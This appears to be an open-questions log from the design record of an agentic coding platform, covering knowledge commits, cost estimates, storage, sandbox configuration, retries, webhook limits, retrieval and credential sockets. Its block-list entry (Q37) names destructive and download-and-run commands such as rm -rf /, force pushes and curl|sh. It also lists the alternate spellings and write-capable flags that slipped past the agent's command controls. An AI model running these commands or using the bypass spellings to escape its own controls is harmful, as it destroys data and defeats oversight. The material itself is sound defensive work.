**Q66 `auto_apply` is documented as "committed directly", and WP-18b commits it on a branch with a merge request instead — which is a smaller promise than the words, and the difference is a product decision.** BD-018 says a proposal between the thresholds "is committed directly with an audit line and no queue entry" when a project opts into `auto_apply`; product/07 §3 repeats it; technical/07 step 4 offers *"push to the knowledge branch → MR (or direct push to default branch when the project allows and the branch is not protected)"*. WP-18b built **only the first half**: every accepted proposal, auto-applied or maintainer-approved, lands as a commit on `agentic/knowledge/<date>-<batch>` with an open merge request, and nothing the platform writes ever reaches the default branch. — *Recommendation, implemented: keep it that way, and read `auto_apply` as "no **queue** entry", not "no review".* Three reasons, in the order they bind. **(1) BD-025.** The platform reads `.agentic/`, `CLAUDE.md` and `.claude/` — the vault included — from the **default branch**, so a direct push is the one write that changes the rules every later run is governed by with no human in between; the same argument BD-007 makes for code. **(2) It is not free to build.** A direct push needs the protection check (`isBranchProtected`, the compensating control for Q40) *and* an answer for what happens when the branch is protected, which is either "silently fall back to an MR" — making `auto_apply` mean two different things depending on a setting the operator cannot see from the proposal queue — or "fail the apply", which parks knowledge nobody is waiting for. **(3) What `auto_apply` still buys is real**: the proposal never appears in the maintainer's queue, the commit happens within seconds of the retrospective, and the MR is a single review of a batch rather than a decision per page. **What this leaves for the founder**: whether a project should be able to ask for the true direct push (and therefore accept that a knowledge commit changes the next run's rules unreviewed), and whether an un-merged knowledge MR should expire — today it sits open for ever and the proposals in it stay `applied`, so a vault whose maintainers ignore the MRs drifts from the index without anything saying so. — *Refiner note (session 5): the founder's half stays open, and the engineering half is the same whichever way it is answered — **nothing detects the drift**, so neither expiry nor a nag nor "leave it" can be implemented today. The two facts are genuinely different and nothing compares them: a proposal is `applied` when a commit carries it (`kb_proposals.applied_commit_sha`, migration `0008_knowledge.sql:73`), while the vault the platform indexes is the **default branch** (TD-026) — so every auto-applied proposal is `applied` and absent from the index until a human merges, which is the normal state rather than the exceptional one. Cheapest detector, and it needs no new job: the nightly hygiene pass already runs once per project per night and already reads the index, so an `applied` proposal whose `target_path` is not in the indexed vault is one more finding kind in `kb_health_reports` — at path level from the index alone, at content level only with a document read. That report now has a **reader** — `GET /api/projects/:id/kb/health`, WP-15h part 2 — and still no **screen**, so the drift finding would be visible over HTTP the day it is computed and invisible to a maintainer until the UI has somewhere to put it (PROGRESS backlog **37**'s remaining half). No measurement is needed to start; owner: none today.*

**Q65 product/09 says a task's cost estimate is "size × project history" and stops there, so the platform has to choose a model — and the choice decides which tasks a maintainer is asked to approve.** WP-19 implemented the estimate at refinement: `tasks.size` comes from the `RefinedSpec` the refinement stage produces, and `tasks.estimate_usd` from the project's finished tasks. What the product documents do not say is *how* the two combine, and three sub-questions follow from that. **(a) What is the unit?** The shipped answer is a per-size weight — `S:1, M:2, L:4, XL:8` — so the estimate is `mean(actual ÷ weight(sample size)) × weight(this size)`; when every sample is this size it collapses to the plain mean, which is the reading of "size × project history" that needs no extra assumption. The doubling itself is an assumption in the same class as BD-013's model defaults, which Q23 accepted "provisionally; revisit after 20 dogfood tasks". **(b) What does a project with no finished task get?** The shipped answer is `null` with `basis: 'unknown'`, falling back to the *organisation's* history first — never a default number, because `requiresBudgetApproval(preset, estimateUsd)` compares the estimate against a threshold and an invented figure would route real tasks past a human, or park cheap ones in front of one (standing rule 16). **(c) Is the estimate re-made when refinement runs again?** The shipped answer is no: it is the expectation set *before* the spend, which is what makes `estimateAccuracy(estimate, actual)` mean anything afterwards. **Recommendation, implemented:** keep all three, and revisit (a) with real numbers after the first twenty dogfood tasks — `tasks.estimate_usd` beside `tasks.cost_actual` is all the data that needs; if the founder wants a different curve, it is one table in `packages/domain/src/cost/estimate.ts` and no other code moves. **Not yet decided and deliberately not guessed:** the per-project threshold that routes an expensive task to a budget approval is `AutonomyPreset.budgetApprovalThresholdUsd` and **nothing consults it** — WP-19 produces the estimate, and the approval gate that would read it belongs with the autonomy work (BD-027, product/18).

**Q63 The knowledge indexer needs a second bare mirror per project on the platform's own disk, and nobody owns that disk budget.** TD-026 rules that WP-18 reads the vault from a platform-side bare mirror rather than from the launcher's `repo-cache` volume, because only the launcher can advance that one and it is refreshed before each *run* rather than after each *merge* — so a project's repository is now cloned twice on the instance's disk. The technical half is decided; what is not decided is the operator-facing half. product/19 §20 gives the platform a storage gauge with a warning at 50 GB and purge by month partitions, and that gauge is about the **database**: transcripts, events, blobs. Mirrors are none of those, they are not partitioned by month, and they grow with the size of the customer's repository rather than with the platform's own activity — a single monorepo can outweigh a year of transcripts. — *Recommendation (three parts, in the order they get cheap):* **(1) Put the mirrors in the same gauge.** An operator who sees one storage number and then runs out of disk somewhere else has been told the wrong thing; the gauge should report database and mirror bytes as two lines under one total, and the mirror line should break down per project because that is the axis an operator can act on. **(2) Purge by last use, not by age.** A mirror is a pure cache — BD-012 already says the derived state is rebuildable — so the safe policy is least-recently-indexed eviction under a configurable ceiling (proposed default: no ceiling, with the gauge warning at the same 50 GB, because a ceiling that silently evicts the mirror of an active project turns the next index run into a full re-clone at the worst moment). Deleting one costs a re-clone and nothing else. **(3) Only then consider the blobless clone.** `--filter=blob:none` would make the platform's copy trees and commits with document blobs fetched on demand, which is the real fix for a monorepo, and it is deferred in TD-026 for two honest reasons: it needs `uploadpack.allowFilter` on the git server (unverified for self-managed GitLab, and in `docs/TODO.md`) and it turns every document read into a network call that can fail inside a vault read. Confirm, and decide the one thing the recommendation deliberately leaves open: whether an operator may **exclude a project from indexing altogether** to keep its repository off the platform's disk, which is a product statement about what a project gets rather than a storage knob — today every project with a git binding would get a mirror the first time its indexer runs.

*Status at WP-18a — the technical half shipped and **none of the three parts is implemented**, which is stated rather than left to be discovered.* Part **(2)'s default is what the code does**: there is no ceiling and no eviction, so a mirror is created on a project's first index run and never removed — which is the recommendation's own proposed default, reached by not building the knob rather than by choosing it. Part **(1) cannot be done yet**: product/19 §20's storage gauge does not exist in this build (nothing reports database bytes either), so there is no single number for mirror bytes to become a second line of; when it is built, the per-project directory name is `mirrorCacheKeyFor(projectId)` under `APP_KNOWLEDGE_MIRROR_ROOT` and a `du` per directory is the whole measurement. Part **(3)** is deferred in TD-026 and is in `docs/TODO.md` under Verification. What is now **live** rather than hypothetical is the last sentence above: `task.created` triggers an index run for every project with a git binding, so the first task of each project clones its repository onto the platform's disk with nothing bounding the total.

**Q62 `.agentic/config.yml` has no workspace section, so a project cannot narrow its own run containers — and adding one would put container policy in a file an attacker with a merge request can edit.** WP-15g built the first production `WorkspaceSpec` (`packages/infrastructure/src/workspace/spec.ts`) and every field of it comes from **instance** configuration and the git binding: TD-021's limits (2 CPU / 4 GiB / 512 pids / 512 MiB tmpfs / 20 s stop grace), `runc`, three days of volume retention, `readOnly` derived from the run's own tool policy, and an egress allow-list that is the model provider's host plus the git host. `agenticConfigSchema` has no key for any of them, so BD-025's *narrow-never-widen* rule holds **by construction** rather than by a merge — there is nothing a project can say. That is the strongest form of the rule and it is also a limitation: a repository that wants gVisor for its own runs, or less memory, or one more registry host, cannot ask. — *Recommendation (implemented as the absence, and this question is whether to keep it):* **keep the workspace out of the repository's own configuration until an operator asks for it.** Three reasons. **(1)** Every key added there is a key somebody who can open a merge request can propose, and BD-025 reads agent configuration from the **default branch** precisely because the task branch is untrusted — a narrowing key is safe by definition, but the review that keeps it narrowing is not free. **(2)** The one field a project would most want to widen is the egress allow-list, and that is the field that must not be project-editable at all: technical/05 fills it from *discovery*, which does not exist yet, so a run cannot install a package today — measured and asserted by `packages/infrastructure/src/workspace/spec.test.ts` › *"has no registry host, because discovery does not exist — so a run cannot install a package"* — and the honest fix is discovery rather than a config key. **(3)** A merge function nothing feeds is a merge function nobody tests (standing rule 31's shape), so the narrowing logic should arrive with its first real caller. Confirm, and if the answer is to add the section, decide **which** fields a project may lower: `limits` and `runtime` are the safe two, `keepUntil` is retention policy an operator owns, and `egress` and `readOnly` are the platform's and should stay so. — *Refiner note (session 4): this is a **confirm-the-absence** question rather than a gate — nothing in the tree is blocked by it and the recommendation is the state that shipped, so it can wait for a trigger, and the trigger belongs in the question: the first project or operator that asks for a different `runtime` or one more egress host. Note the two halves age differently. The `limits`/`runtime` half is a product decision about self-service and stays open. The `egress` half is **not really open**: technical/05 fills the allow-list from discovery, discovery does not exist, and until it does a run cannot install a package — so an operator asking for *one more registry host* is asking for discovery, and answering it with a config key would be answering the wrong question. `keepUntil` is also not free to hand over while technical/05:10's 14-day window for a paused or taken-over workspace is itself unimplemented (PROGRESS backlog **7**).*

**Q59 A task whose stage cannot be *started* has no product-visible ending, and the day a webhook can reach the pipeline is the day a real ticket meets one.** `StageExecutor` has exactly two endings for an agent stage — the run completed and produced an artifact, or the run ended without a usable result and the task is escalated. A `runner.start()` that **throws** had neither: transaction 1 has already created the `runs` row and emitted `run.created`/`run.started`, so the run stayed `running` for ever, the task sat at a stage nothing would move, and the `stage.execute` job retried into pg-boss, where no screen in the product shows it. That is not hypothetical in this build: `unavailableClaudeRunner` (`apps/server/src/pipeline.ts`) throws `RunnerUnavailableError` because the runner-to-launcher transport is **Q52**, deliberately unbuilt — and until WP-15c nothing produced a ticket, so nothing ever reached an agent stage. WP-15b's discovered work named the question and left it to whoever landed the ingress first. — *Recommendation (implemented in `packages/application/src/pipeline/stage-executor.ts`):* **no new task state.** `escalateTask` already means *a human must act*, it is what the executor does for every other run that ends without a usable result, and the product's screens, templates and `retry-stage` command all know it; a third spelling of "stuck" would be a state no query, template or screen knows about, and it would need a migration to an enum the interpreter reads. So a `start` that throws now fails the run it had already created (`run.failed`, `error_during_execution`, zero usage and zero cost) and escalates the task, in one transaction, with the error's **class name** in the reason and never its message — a runner's error may quote a provider, a URL or a credential, and the executor holds no redactor. Confirm, and decide two things. **(a) Retries.** The escalation happens on the *first* failure, so a transient start failure no longer gets the job's two retries; that is the direction that tells somebody, and `POST /api/tasks/:id/retry-stage` is the human's answer, but a transport that flaps (which Q52's answer may well produce) would escalate a task per flap. If that is wrong, the fix is a retryable/terminal distinction on the runner's errors rather than a new state. **(b) Whether `unavailableClaudeRunner` should exist at all once Q52 is answered** — a build with no transport could refuse to compose the pipeline instead of composing one that escalates every agent stage, which is louder but also stops the gates, the status mapping and the workpad from running at all.

*Both sub-decisions built at WP-15g; **(a) came back as the recommendation's own fallback** and is recorded here so it is not re-derived.* **(a) Retries: implemented as a retryable/terminal distinction on the runner's errors**, not as a new state. `RunStartError` (`packages/application/src/ports/runner.ts`) carries `retryable`, `isRetryableStartFailure` answers **false** for anything that is not one (fail closed), and the stage executor's catch branches on it: a retryable failure **fails the run it created** — so a flap costs one visible `runs` row rather than a row left `running` — leaves the task untouched at its stage on its attempt, and returns a new `{kind:'retry'}` outcome that `pipeline/jobs.ts` turns into a re-enqueue with `start_attempts` in the payload, the way `gate_checks` already rides one. **What bounds it, stated because "an unbounded retry hides a dead launcher" is half the question:** `MAX_RUN_START_ATTEMPTS = 3` at `RUN_START_RETRY_MS = 30_000`, so about a minute of flapping is absorbed with no human and a launcher that is genuinely down escalates about a minute later. The counter is in the **job payload** rather than in the executor, because the process that retries may not be the one that failed. Which failures are retryable is one function — `classifyProvisionFailure` (`packages/infrastructure/src/runner/workspace-runner.ts`) — over `WorkspaceError.code`: `engine_unavailable`, `workspace_failed` and `not_found` are conditions that pass, `invalid_spec` is a statement about *this* spec, and anything unrecognised is terminal. **(b) `unavailableClaudeRunner` stays, and is conditional on configuration**: `composeAgentRunner` (`apps/server/src/agent.ts`) composes the real runner when the process has a workspace provisioner and, in `api` mode, a model credential, and otherwise returns the **named** list of what is missing, which `startRuntime` logs. A process without them still runs intake, the gates, the status mapping, the workpad and every outbound provider call, and `/readyz` stays `ok` — asserted by `test/e2e/pipeline/agent-run.e2e.test.ts` › *"stays ready, does the non-agent work, and escalates the stage that needs an agent"*.

**Q60 Nothing rate-limits the webhook endpoint, and it is the platform's only unauthenticated door.** technical/08 § "Rate limits and safety" says "webhook endpoints limited per integration" and WP-15c shipped none. What bounds the cost today is stated rather than implied: a **refused** delivery writes one `integration_actions` row and **no** event and **no** `inbox` row (the last is deliberate — a dedup key an unauthenticated caller can choose is a key it can poison), so the amplification an attacker who knows an integration's uuid can buy is one insert per request against a partitioned, append-only table; an **accepted** delivery costs one `inbox` row and its events, and requires the binding's own signature. — *Recommendation:* **a token bucket per `integrations.id` in front of `verify`, answering 429 with `Retry-After`, reusing `packages/application/src/integrations/rate-limiter.ts` rather than writing a second one.** It has to come *before* the signature check to be worth anything (verification is the expensive part of a flood) and *after* the integration lookup, so the bucket is per account rather than global — which means one database read survives the limit, and that is the honest cost. Confirm, and decide whether a limited delivery is audited (one row per refusal re-opens the amplification the limit exists to close, so probably a counter and a log line rather than a row) and whether the bucket is shared with the outbound budget of the same integration or is its own.

**Q58 Retrieval has no precision floor, and every mechanism that would give it one is a choice of ranking signal — which is a product decision, not an engineering one.** Nothing between a degenerate query and the context pack rejects it. WP-16 round 1 measured a single stopword query filling **87 %** of the token budget with padding; the *cause* found underneath it was different (`websearch_to_tsquery` joins bare words with **AND**, so the acceptance query matched **0 documents against a real PostgreSQL while the in-memory double returned 15**) and was fixed by extracting keywords and joining them with `OR`. **No relevance floor shipped**, and both candidate shapes were rejected by measurement rather than by preference (`packages/domain/src/knowledge/retrieval.ts:152` and `:163`): an **absolute** floor is backwards, because `ts_rank_cd` measures cover density and a common word is dense — `"the"` ranked padded pages at **0.947** while a good query ranked its correct answer at **0.048**, so every threshold that excludes the noise excludes the signal by a factor of twenty; and a floor **relative to the best text score** is store-dependent, because the correct second answer sits at **0.667** of the best against PostgreSQL and at **0.267** against the in-memory double on the same corpus and the same query, so the 0.3 ratio drawn from the PostgreSQL numbers dropped the right page on the store the acceptance figure is measured on. Those two are **pre-fix figures and cannot be reproduced** — that state is gone — so they are evidence about why a floor was rejected, not numbers to tune a new one against. What the shipped fix closes is narrow and store-independent: `MIN_QUERY_TERM_LENGTH = 4` (`packages/domain/src/knowledge/query.ts:45`) drops tokens of **three characters or fewer**, so `"the"` and `"and the of"` extract to no terms at all — and the module's own docblock says what survives: *"it keeps `with`, `that` and `from`"*. Round 2 measured the consequence (`retrieval.ts:176`): the query `"that this with from have been were will your they able such their"` yields 13 terms, returns **10 documents** at ranks **0.900 / 0.898 / 0.898 / 0.898**, and fills **10 707 of 12 000** tokens with **six tier-1 documents**, its top score **0.718** — *above* a good query's correct answer at **0.500** (that good query returns 12 documents and packs 10 552/12 000, the acceptance figure). The 87 %-padding pack is still reachable. A mechanism robust to function words of four letters or more cannot be a length rule and cannot be a fixed number: it needs a signal derived from the corpus, and each candidate trades something the product owns — which is why this is here and not in a work package. — *Recommendation:* **derive inverse document frequency from the project's own index at index time, drop a query term whose document frequency exceeds a threshold, and return no documents when no term survives.** Not a language dictionary and not a stopword list: the knowledge base is mixed Czech/English by design (the fixture vault is, and technical/07's `simple` text-search configuration was chosen for exactly that reason), so `english` would strip function words at both index and query time at the price of committing every project to one language and adding stemming, and a hand-written stopword list is a maintained scope that drifts in the dangerous direction (standing rule 7) and would need one list per language. IDF needs none of that: the indexer already tokenises every chunk, so a per-project lexeme document-frequency table is close to free, and a term that appears in most of a project's documents is uninformative *in that project* whatever language it is in. A query whose terms all drop must return **nothing** rather than everything — the pack then falls back to tier 0 plus the author's own `paths:` globs, which is exactly what a three-letter degenerate query already does today, and an empty result that is honest beats ten pages that are not (standing rule 18). **Q50 TD-025 says the workspace's credential helper uses "the same Unix socket" as the runner's control connection, and the two halves of that sentence cannot both hold.** §1 says the shim "accepts exactly **one** authenticated control connection"; §3 says "the git credential helper inside the workspace talks to the shim over **the same Unix socket** (`cred.get`)". A helper connecting to `/ctl/ctl.sock` *is* a second connection, and the single-connection rule is not a nicety — it is the reason a compromised agent cannot drive `spawn`, because the runner takes the slot before the child exists. WP-13 could not defer it: `cred.get` is a named deliverable and the socket is where it arrives. — *Recommendation (implemented in `packages/infrastructure/src/runlet`):* **two sockets on the same per-run control directory.** `/ctl/ctl.sock` is the runner's, one authenticated connection ever, every later connection refused before a decoder is attached. `/ctl/cred.sock` is the workspace's, and it is **unauthenticated on purpose**: the helper runs as the same uid as the shim, so it can read the shim's environment, the token file on `/ctl` and in most configurations the shim's memory — a token there would authenticate nothing, and pretending otherwise would be standing rule 18's shape (a credential that is not one). The teeth are elsewhere: the credential socket accepts exactly `cred.get` and `ping` and refuses every other frame; a `cred.get` can name **one lowercase DNS host over https** and nothing else (cleartext has no representation in the schema at all); the shim generates the `request_id` the runner sees, so one helper cannot name another's pending question; requests are capped per run and per concurrency, and refused outright before `spawn` and from the moment the child exits — the last of those was **false when this entry was first written**, and the correction is the interesting part: the guard read `child === null`, which `spawn` makes untrue for ever, so a `cred.get` arriving between the child's exit and the shim's teardown (at least `stdioFlushMs`, and unbounded while a grandchild holds the stdout pipe open) was forwarded to the runner. The shim now reads the child's *exit status*, and a test drives the window with a child that outlives its own exit; and **the shim holds no allow-list and no credential** — the decision is the runner's, on the platform side of the volume, where the agent cannot read it. Confirm, and decide two things: whether TD-025 §3 should be amended to say "the same control **volume**, a second socket" (the neutral reading of its own design), and whether a run's git-host allow-list should *also* be enforced inside the shim as defence in depth, which would mean shipping the list into the container that is trying to get past it.

**Q51 The run container and the platform's runner container must agree on a uid, and nothing in the record says which.** TD-025 §2 has the runner connect to `/run/agentic/ctl/<run-id>/ctl.sock`, a socket the shim creates inside the run container; technical/05 pins the *run* container at `user: 1000:1000`; nothing pins the platform's. WP-13 creates the socket `0600`, which is the fail-closed choice and means the runner must connect as uid 1000 as well — verified working with both containers at 1000 (`research/12`). WP-13 could not defer it: a socket is created with *some* mode, and a wide one on a shared volume would let anything else on that volume drive the run. — *Recommendation (implemented as `0600`, with no option to widen it):* keep `0600` and make **"the runner process runs as uid 1000"** a constraint WP-14 satisfies, rather than adding a mode knob an operator can widen. The alternative is a shared gid with `0660`, which needs a `RUNLET_SOCKET_MODE` and is one typo away from `0666`. Confirm, and decide whether the launcher should assert the two uids match when it creates a run and fail loudly, instead of letting the mismatch surface as a connection refused.

Confirm, and decide whether TD-024 should be amended to say "handwritten thin clients on native fetch for **all five** providers" — the neutral reading of its own rationale — or whether the dependency is wanted for a reason the record does not state (Bolt's assistant/agent features, or its reconnection handling, are the two candidates).

**Q40 A git provider token cannot be scoped to a branch pattern, so what enforces `push:agentic/*`?** BD-025 and the `GitProvider` port describe a minted credential carrying `branchPatterns` — `push:agentic/*` — and WP-09 found that GitLab has no such thing: a project access token carries *scopes* (`read_repository`, `write_repository`) and a *role*, and nothing narrower. **Q41 Whether the SDK session mirror is redacted.** TD-012 enumerates the write paths redaction applies to — `run_messages`, `integration_actions`, `events.payload`, `config_audit`, artifacts and KB commits — and the Agent SDK's `sessionStore` mirror is not among them. **Q37 Hazards the command block-list of `product/19` §3 states as one spelling each.** The list gives `rm -rf /*`, `git push --force*`, `git push origin :*`, `git branch -D *` and `curl * | sh` / `wget * | sh`. Every one of them is a hazard written as a single spelling, and the other spellings of the same hazard do not match the pattern: `rm -fr /`, `rm -r -f /`; `git branch --delete --force main`; `git push -f`, `git push … --delete` / `-d`, the force refspec `git push origin +agentic/x:main`, and the plain refspec `git push origin agentic/foo:main`, which writes `main` under an allow entry that names only `agentic/*`; and `curl http://x|sh`, `| bash`, `| /bin/sh`, `|&`, `wget -O- http://x|sh`. WP-02 declined to invent the missing patterns (security rules belong in the document, not in code the document does not state), named the gap in `DECLINED_BLOCK_VARIANTS`, and recorded that they all land on `ask`, never `allow`. **WP-02a disproved that last claim:** `git push origin agentic/x -f`, `git push origin agentic/x --delete` and `git push origin agentic/foo:main` all returned **allow**, because the allow entry `git push origin agentic/*` was carrying them, and the `curl|sh` spellings returned `ask` rather than `block`. The line the code now draws: a missing spelling that only decides between `ask` and `block` stays the document's to fix — the command can never reach `allow`, so the code is not what is keeping it out; a missing spelling reachable from the **allow**-list is closed in code, because the allow-list is the one thing the module defends. So `git push -f*`, `git push --delete*`, `git push -d*` and `git push origin +*` joined the block list, the refspec form floors at `ask`, and the `curl|sh` family is caught by normalising a pipeline's spacing and spelling any shell stage `sh`; `rm -fr /` and `git branch --delete --force main` are unchanged and still `ask`. — *Recommendation:* amend product/19 §3 to state the hazards rather than one spelling of each — `rm` with any recursive flag outside the workspace; branch deletion in either form; force-pushing, deleting or retargeting a remote ref in any spelling, refspecs included; piping a download into any shell — so that the document and the code say the same thing. Two further items on that list (`any command writing outside the workspace`, `network calls to non-allow-listed hosts`) cannot be a command pattern at all and are enforced by the run container and the egress proxy (TD-021); they are recorded in `UNPATTERNABLE_BLOCK_ITEMS`. WP-02a also found that this module's approximation of the first of those two — flooring a `> file` redirection at `ask` — is walked around by flags that write a path directly (`git diff --output=`, `git log --output=`, GNU `find -fprintf` / `-fls`, all verified against the real tools); they are now floored by `HAZARDOUS_ARGUMENTS`, along with `pip install --target/--root/--prefix/--log/--report`. A second review round added two more families to the same list: `git difftool --extcmd`, and `git log --ext-diff` / `git show --textconv`, which run whatever the *repository's own* config names and so are untrusted input under BD-022.
